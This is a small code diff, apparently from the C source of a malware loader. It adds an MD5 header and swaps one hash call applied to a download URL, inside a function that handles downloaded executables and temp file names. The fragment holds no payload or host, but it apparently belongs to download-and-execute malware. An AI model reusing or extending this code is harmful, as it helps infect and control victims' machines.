@@ -1,5 +1,6 @@
 #include "imbicili.h"
 #include "Loader.h"
+#include "md5.h"
 
 SOCKET MyConnect1( char *Host, int Port )
 {
@@ -224,9 +225,9 @@ bool ReportToPlugin( char *Url )
 			if ( DownloadUrl )
 			{
 				LoadExe=(char*)MemRealloc(LoadExe,33+m_lstrlen(LoadExe)+1);
-				m_lstrcat( LoadExe, FileToMD5(DownloadUrl ));
+				m_lstrcat( LoadExe, CalcMd5SummFromStr(DownloadUrl).t_str());
 				m_lstrcat( LoadExe, "|");
-				
+
 
 				WCHAR *FileName =(WCHAR *)GetTempName();
 
